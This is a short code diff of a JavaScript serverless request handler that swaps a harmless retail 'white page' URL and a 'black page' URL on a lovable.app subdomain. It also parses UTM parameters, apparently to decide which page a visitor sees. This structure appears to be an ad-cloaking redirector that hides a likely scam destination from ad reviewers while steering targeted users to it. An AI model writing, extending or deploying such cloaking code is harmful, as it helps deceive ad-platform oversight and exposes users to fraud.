@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.king-jouet.be/jeu-jouet/vehicules-circuits-jouets-radiocommandes/Autres-vehicules/ref-994602-camion-depannage-et-remorquage-scania-super-560r-avec-module-son-et-lumiere.htmv";
-    const blackPageURL = "https://casssshlov.lovable.app/";
+    const whitePageURL = "https://www.babyshower.es/en/jellycat-beige-bunny-musical-pull-717.html";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
